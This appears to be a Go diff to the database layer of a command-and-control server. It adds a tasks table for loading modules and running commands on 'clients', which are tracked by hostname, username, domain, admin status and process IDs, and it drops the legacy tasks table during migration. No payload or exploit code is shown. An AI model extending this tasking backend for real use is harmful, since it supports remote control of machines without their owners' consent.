@@ -12,6 +12,25 @@ import (
 	"golang.org/x/crypto/argon2"
 )
 
+const tasksSchema = `CREATE TABLE IF NOT EXISTS tasks(
+	  id          INTEGER PRIMARY KEY AUTOINCREMENT,
+	  TaskID      INTEGER NOT NULL UNIQUE,
+	  ClientID    INTEGER NOT NULL,
+	  CampaignID  TEXT NOT NULL,
+	  Kind        TEXT NOT NULL CHECK (Kind IN
+	               ('load-module','unload-module','list-modules','run-command')),
+	  Module      TEXT,
+	  ModuleID    INTEGER,
+	  Command     TEXT,
+	  Code        INTEGER,
+	  Args        TEXT NOT NULL CHECK (json_valid(Args)),
+	  Status      TEXT NOT NULL DEFAULT 'pending'
+	               CHECK (Status IN ('pending','sent','done','failed')),
+	  created_at  DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
+	  sent_at     DATETIME,
+	  completed_at DATETIME
+	);`
+
 var migrations = []string{
 	`CREATE TABLE IF NOT EXISTS users(
 		id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -32,29 +51,29 @@ var migrations = []string{
 		FOREIGN KEY(uuid) REFERENCES campaigns(uuid) ON DELETE CASCADE
 	);`,
 	`CREATE TABLE IF NOT EXISTS signature(
-		id INTEGER PRIMARY KEY AUTOINCREMENT,
-		UserID INTEGER NOT NULL,
-		MetaHash TEXT NOT NULL,
-		Salt TEXT,
-		LicenseID TEXT NOT NULL,
-		MachineID TEXT NOT NULL,
-		ProductUUID TEXT NOT NULL,
+		id            INTEGER PRIMARY KEY AUTOINCREMENT,
+		UserID        INTEGER NOT NULL,
+		MetaHash      TEXT NOT NULL,
+		Salt          TEXT,
+		LicenseID     TEXT NOT NULL,
+		MachineID     TEXT NOT NULL,
+		ProductUUID   TEXT NOT NULL,
 		ProductSerial TEXT NOT NULL
 	);`,
 	`CREATE TABLE IF NOT EXISTS clients(
-		id INTEGER PRIMARY KEY AUTOINCREMENT,
-		ClientName TEXT NOT NULL,
-		ClientID   INTEGER NOT NULL,
-		IsAdmin   INTEGER NOT NULL,
-		Pid   INTEGER NOT NULL,
-		PPid   INTEGER NOT NULL,
+		id           INTEGER PRIMARY KEY AUTOINCREMENT,
+		ClientName   TEXT NOT NULL,
+		ClientID     INTEGER NOT NULL,
+		IsAdmin      INTEGER NOT NULL,
+		Pid          INTEGER NOT NULL,
+		PPid         INTEGER NOT NULL,
 		CampaignUUID TEXT NOT NULL,
-		Hostname TEXT NOT NULL DEFAULT '',
-		Username TEXT NOT NULL DEFAULT '',
-		Domain TEXT NOT NULL DEFAULT '',
-		Country TEXT NOT NULL DEFAULT '',
-		Arch TEXT NOT NULL DEFAULT '',
-		created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
+		Hostname     TEXT NOT NULL DEFAULT '',
+		Username     TEXT NOT NULL DEFAULT '',
+		Domain       TEXT NOT NULL DEFAULT '',
+		Country      TEXT NOT NULL DEFAULT '',
+		Arch         TEXT NOT NULL DEFAULT '',
+		created_at   DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
 		FOREIGN KEY(CampaignUUID) REFERENCES campaigns(uuid) ON DELETE CASCADE
 	);`,
 	`CREATE TABLE IF NOT EXISTS user_uploads(
@@ -68,15 +87,7 @@ var migrations = []string{
 		uploaded_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
 		FOREIGN KEY(CampaignUUID) REFERENCES campaigns(uuid) ON DELETE CASCADE
 	);`,
-	`CREATE TABLE IF NOT EXISTS tasks(
-		id INTEGER PRIMARY KEY AUTOINCREMENT,
-		TaskID INTEGER NOT NULL,
-		ClientID INTEGER NOT NULL,
-		CampaignID TEXT NOT NULL,
-		CmdCode  INTEGER NOT NULL,
-		Args     TEXT NOT NULL CHECK (json_valid(Args)),
-		FOREIGN KEY(ClientID) REFERENCES clients(ClientID) ON DELETE CASCADE
-	);`,
+	tasksSchema,
 }
 
 type DB struct {
@@ -90,6 +101,14 @@ func New() (*DB, error) {
 	if err != nil {
 		return nil, err
 	}
+	if err := migrateTasks(db); err != nil {
+		db.Close()
+		return nil, err
+	}
+	if _, err := db.Exec(tasksSchema); err != nil {
+		db.Close()
+		return nil, err
+	}
 
 	return &DB{conn: db}, nil
 
@@ -98,6 +117,11 @@ func New() (*DB, error) {
 func Setup(path string) (*sql.DB, error) {
 	conn, err := sql.Open("sqlite", path)
 	if err != nil {
+		return nil, err
+	}
+
+	if err := migrateTasks(conn); err != nil {
+		conn.Close()
 		return nil, err
 	}
 
@@ -142,6 +166,39 @@ func Setup(path string) (*sql.DB, error) {
 
 	return conn, nil
 
+}
+
+func migrateTasks(conn *sql.DB) error {
+	rows, err := conn.Query(`PRAGMA table_info(tasks)`)
+	if err != nil {
+		return err
+	}
+	legacy := false
+	exists := false
+	for rows.Next() {
+		var cid, notNull, primaryKey int
+		var name, dataType string
+		var defaultValue sql.NullString
+		if err := rows.Scan(&cid, &name, &dataType, &notNull, &defaultValue, &primaryKey); err != nil {
+			rows.Close()
+			return err
+		}
+		exists = true
+		if name == "CmdCode" {
+			legacy = true
+		}
+	}
+	if err := rows.Err(); err != nil {
+		rows.Close()
+		return err
+	}
+	rows.Close()
+	if exists && legacy {
+		if _, err := conn.Exec(`DROP TABLE tasks`); err != nil {
+			return err
+		}
+	}
+	return nil
 }
 
 func InsertUser(user, password, userID string, conn *sql.DB) error {
